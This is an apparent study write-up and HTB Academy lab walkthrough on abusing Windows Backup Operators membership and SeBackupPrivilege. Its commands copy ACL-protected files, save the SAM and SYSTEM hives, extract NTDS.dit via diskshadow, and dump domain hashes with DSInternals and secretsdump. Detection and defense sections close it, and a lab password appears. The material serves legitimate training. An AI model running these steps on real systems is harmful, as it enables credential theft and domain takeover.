# Windows Built-in Groups Privilege Escalation

## 🎯 Overview

**Windows Built-in Groups** provide specific privileges to enforce least-privilege principles without granting full administrative access. These groups exist on servers from **Windows Server 2008 R2** to present, with some exceptions. Understanding membership implications is crucial for both **privilege escalation** and **security assessment**.

## 🏛️ Key Built-in Groups

### High-Privilege Groups
| Group | Key Privileges | Attack Potential |
|-------|---------------|------------------|
| **Backup Operators** | SeBackup, SeRestore | NTDS.dit access, file system bypass |
| **Event Log Readers** | Event log access | Sensitive log data extraction |
| **DnsAdmins** | DNS service control | Code execution via DLL injection |
| **Hyper-V Administrators** | VM management | VM escape, hypervisor attacks |
| **Print Operators** | Print service control | Service manipulation attacks |
| **Server Operators** | Service management | Service privilege escalation |

### Assignment Contexts
```cmd
# Common reasons for assignment:
- Least privilege enforcement (avoiding Domain Admin creation)
- Vendor application requirements
- Backup and restore operations
- Testing scenarios (often forgotten)
- Service account requirements
```

**Assessment Priority:**
- Always enumerate group memberships (`whoami /groups`)
- Document excessive/unnecessary memberships
- Review historical assignments (leftovers from testing)

## 🔐 Backup Operators - SeBackupPrivilege Exploitation

### Privilege Fundamentals

#### SeBackupPrivilege Capabilities
- **Folder traversal** without ACL restrictions
- **File copying** from protected directories  
- **Registry hive backup** (SAM, SYSTEM, SECURITY)
- **NTDS.dit access** on Domain Controllers
- **ACL bypass** with FILE_FLAG_BACKUP_SEMANTICS

### Detection and Enablement

#### Group Membership Verification
```cmd
# Check current group memberships
whoami /groups

# Look for:
BUILTIN\Backup Operators                       Group S-1-5-32-551
```

#### Privilege Enumeration
```cmd
# Check privilege status
whoami /priv

# Expected output:
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
```

### Privilege Activation

#### Method 1: PowerShell Modules
```powershell
# Import required libraries
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

# Check privilege status
Get-SeBackupPrivilege
# Output: SeBackupPrivilege is disabled

# Enable privilege
Set-SeBackupPrivilege

# Verify activation
Get-SeBackupPrivilege
# Output: SeBackupPrivilege is enabled

# Confirm via whoami
whoami /priv
# SeBackupPrivilege should show as "Enabled"
```

#### Method 2: Elevated Context
```cmd
# May require elevated Command Prompt to bypass UAC
# Run Command Prompt as Administrator
# Enter Backup Operators user credentials when prompted
```

## 💾 File System Exploitation

### Protected File Access

#### Standard Access Failure
```powershell
# Attempt normal file access
dir C:\Confidential\
cat 'C:\Confidential\2021 Contract.txt'

# Expected result:
Access to the path 'C:\Confidential\2021 Contract.txt' is denied.
```

#### SeBackupPrivilege Bypass
```powershell
# Use specialized copy function
Copy-FileSeBackupPrivilege 'C:\Users\Administrator\Desktop\SeBackupPrivilege flag.txt' .\flag.txt
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

# Expected output:
Copied 88 bytes

# Read copied file
cat .\Contract.txt
# Content accessible despite ACL restrictions
```

### Registry Hive Extraction

#### SAM and SYSTEM Backup
```cmd
# Backup critical registry hives
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV

# Expected output for each:
The operation completed successfully.
```

## 🏰 Domain Controller Attacks

### NTDS.dit Extraction Strategy

#### Challenge
- **NTDS.dit** contains NTLM hashes for all domain accounts
- **File locked** by Active Directory services
- **Restricted access** even for privileged users

#### Solution: Shadow Copy Technique

#### Step 1: Create Shadow Copy
```cmd
# Launch DiskShadow utility
diskshadow.exe

# DiskShadow commands sequence:
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```

#### Step 2: Verify Shadow Copy
```powershell
# Examine shadow copy contents
dir E:

# Expected structure:
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2021   1:00 PM                Confidential
d-r---        3/24/2021   6:20 PM                Program Files
d-r---         5/6/2021  12:51 PM                Users
d-----        3/24/2021   6:38 PM                Windows
```

#### Step 3: Copy NTDS.dit
```powershell
# Copy database file using SeBackupPrivilege
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

# Expected output:
Copied 16777216 bytes
```

### Alternative: Robocopy Method
```cmd
# Use built-in robocopy with backup mode
robocopy /B E:\Windows\NTDS .\ntds ntds.dit

# Output:
ROBOCOPY     ::     Robust File Copy for Windows
100%        New File              16.0 m        ntds.dit
   Speed :           356962042 Bytes/sec.
```

## 🔓 Credential Extraction

### Method 1: DSInternals Module

#### Extract Specific Account
```powershell
# Import DSInternals module
Import-Module .\DSInternals.psd1

# Get boot key from SYSTEM hive
$key = Get-BootKey -SystemHivePath .\SYSTEM

# Extract administrator account hash
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key

# Sample output:
DistinguishedName: CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
SamAccountName: Administrator
Secrets
  NTHash: cf3a5525ee9414229e66279623ed5c58
  LMHash:
```

### Method 2: SecretsDump.py

#### Extract All Domain Hashes
```bash
# Use Impacket secretsdump for complete extraction
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

# Expected output:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129:::
htb-student:1103:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
```

## 🎯 HTB Academy Lab Solution

### Lab Environment
- **Credentials**: `svc_backup:HTB_@cademy_stdnt!`
- **Access Method**: RDP
- **Objective**: Leverage SeBackupPrivilege to obtain flag at `c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt`

### Detailed Step-by-Step Solution

#### 1. RDP Connection
```bash
# Connect via RDP to target (IP will be provided)
xfreerdp /v:[TARGET_IP] /u:svc_backup /p:'HTB_@cademy_stdnt!'
```

#### 2. Verify Group Membership
```cmd
# Open Command Prompt
# Check group memberships
whoami /groups

# Look for Backup Operators membership:
BUILTIN\Backup Operators                       Group S-1-5-32-551
```

#### 3. Check Privilege Status
```cmd
# Verify SeBackupPrivilege
whoami /priv

# Expected output:
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
```

#### 4. Enable SeBackupPrivilege
```powershell
# Open elevated PowerShell (Run as Administrator)
# Import required modules (may need to download/locate first)
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

# Enable privilege
Set-SeBackupPrivilege

# Verify activation
Get-SeBackupPrivilege
# Should return: SeBackupPrivilege is enabled
```

#### 5. Target File Analysis
```powershell
# Attempt normal access to verify restriction
cat 'c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt'

# Expected result:
Access to the path is denied.
```

#### 6. Bypass Restriction with SeBackupPrivilege
```powershell
# Copy protected file using SeBackupPrivilege
Copy-FileSeBackupPrivilege 'c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt' .\flag.txt

# Expected output:
Copied [X] bytes

# Read flag content
cat .\flag.txt
# Submit the flag content
```

### Alternative Methods

#### Method 1: Robocopy Approach
```cmd
# Use robocopy with backup mode
robocopy /B "c:\Users\Administrator\Desktop\SeBackupPrivilege" .\backup flag.txt

# Read copied file
type .\backup\flag.txt
```

#### Method 2: Registry Approach (if flag in registry)
```cmd
# Create registry backup
reg save HKLM\SOFTWARE SOFTWARE.SAV

# Extract and analyze offline
```

## ⚠️ Limitations and Considerations

### Explicit Deny ACEs
```cmd
# FILE_FLAG_BACKUP_SEMANTICS won't bypass:
- Explicit DENY entries for current user
- Explicit DENY entries for user's groups
- Always check ACLs before attempting access
```

### Operational Considerations
```cmd
# Best practices:
- Test on non-production systems first
- Document all file accesses
- Clean up temporary files
- Respect client data handling policies
```

## 🔍 Detection Indicators

### Process Activity
```cmd
# Monitor for:
- diskshadow.exe execution
- robocopy.exe with /B flag
- Unusual file access patterns in protected directories
- Registry hive backup operations
```

### Event Logs
```cmd
# Key Event IDs:
Event ID 4656 - Handle to object requested (backup operations)
Event ID 4663 - Access attempt to object (SeBackupPrivilege usage)
Event ID 4673 - Sensitive privilege use (SeBackupPrivilege)
Event ID 5120 - DPAPI key backup (credential access)
```

### File System Changes
```cmd
# Indicators:
- Temporary shadow copies
- Copied NTDS.dit files
- Registry .SAV files in unusual locations
- PowerShell module imports for privilege manipulation
```

## 🛡️ Defense Strategies

### Group Membership Hardening
```cmd
# Regular audits:
- Review Backup Operators membership quarterly
- Remove unnecessary accounts
- Document legitimate business justifications
- Implement approval workflows for additions
```

### Monitoring Implementation
```cmd
# Deploy monitoring for:
- SeBackupPrivilege usage events
- Shadow copy creation activities
- NTDS.dit access attempts
- Registry hive backup operations
```

### Access Controls
```cmd
# Additional protections:
- Implement NTDS.dit backup monitoring
- Use Protected Process Light (PPL) for LSASS
- Enable Advanced Audit Policy settings
- Deploy EDR solutions for behavioral analysis
```

## 📋 Backup Operators Exploitation Checklist

### Prerequisites
- [ ] **Backup Operators membership** verified (`whoami /groups`)
- [ ] **SeBackupPrivilege available** (may be disabled initially)
- [ ] **Elevated context** (Administrator Command Prompt/PowerShell)
- [ ] **Required modules** (SeBackupPrivilegeUtils.dll, SeBackupPrivilegeCmdLets.dll)

### Privilege Activation
- [ ] **Import PowerShell modules** for privilege manipulation
- [ ] **Enable SeBackupPrivilege** (`Set-SeBackupPrivilege`)
- [ ] **Verify activation** (`Get-SeBackupPrivilege`)
- [ ] **Confirm with whoami** (`whoami /priv`)

### File System Exploitation
- [ ] **Identify target files** (sensitive documents, databases)
- [ ] **Test normal access** (verify restriction exists)
- [ ] **Use Copy-FileSeBackupPrivilege** to bypass ACLs
- [ ] **Verify successful copy** and read content

### Domain Controller Attacks
- [ ] **Create shadow copy** (`diskshadow.exe`)
- [ ] **Copy NTDS.dit** from shadow volume
- [ ] **Backup registry hives** (SYSTEM, SAM)
- [ ] **Extract credentials** (DSInternals or secretsdump.py)

### Post-Exploitation
- [ ] **Document accessed files** for reporting
- [ ] **Clean up temporary files** (shadow copies, copied files)
- [ ] **Extract credential data** for further attacks
- [ ] **Report findings** with remediation recommendations

## 💡 Key Takeaways

1. **Backup Operators** provides powerful file system access via SeBackupPrivilege
2. **NTDS.dit extraction** possible on Domain Controllers through shadow copies
3. **ACL bypass** works for most files except explicit DENY entries
4. **Registry access** enables local credential extraction (SAM, SYSTEM)
5. **Robocopy alternative** eliminates need for external PowerShell modules
6. **Detection possible** through privilege usage monitoring and file access logs
7. **Common oversight** - accounts left in group after legitimate backup tasks

---

*Backup Operators group membership provides extensive file system access capabilities that can be leveraged for significant privilege escalation, especially in Domain Controller environments.* 